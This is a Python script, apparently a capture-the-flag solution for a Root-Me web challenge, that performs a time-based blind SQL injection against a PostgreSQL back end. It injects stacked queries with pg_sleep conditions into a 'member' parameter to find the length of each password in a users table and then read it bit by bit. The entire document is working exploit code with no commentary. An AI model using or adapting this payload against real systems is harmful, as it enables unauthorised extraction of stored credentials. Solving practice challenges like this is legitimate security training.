import requests

url = "http://challenge01.root-me.org/web-serveur/ch40/"

def ascii_char(ascii_text):
    decimal_value = int(ascii_text, 2)
    char = chr(decimal_value)
    return char

def get_length(offset):
    for i in range (31):
        condition = f"length((select password from users limit 1 offset {offset}))={i}"
        querry = f"2;SELECT CASE WHEN ({condition}) THEN pg_sleep(2) ELSE pg_sleep(0) END;--"
        params = {
            'action': 'member',
            'member': querry
            }
        response = requests.get(url, params=params)
        if response.elapsed.total_seconds() > 2: return i
    return 0

for pass_index in range(100):
    print(f"pass{pass_index}",end=': ')
    table_name = ""
    length = get_length(pass_index)
    
    if length == 0:
        print("No more password found.")

    for char_index in range(1,length+1):
        ascii_text = ""
        for bit in range(1,8):
            condition = f"substring((ASCII(substring((select password from users limit 1 offset {pass_index}),{char_index},1))::bit(7)::text),{bit},1)=1::text"
            querry = f"2;SELECT CASE WHEN ({condition}) THEN pg_sleep(2) ELSE pg_sleep(0) END;--"
            params = {
                'action': 'member',
                'member': querry
            }
            response = requests.get(url, params=params)

            if response.elapsed.total_seconds() > 2:
                ascii_text=ascii_text+'1'
            else: ascii_text=ascii_text+'0'
        # print(f"{ascii_text}: {ascii_char(ascii_text)}")
        table_name = table_name + ascii_char(ascii_text)
    print(table_name)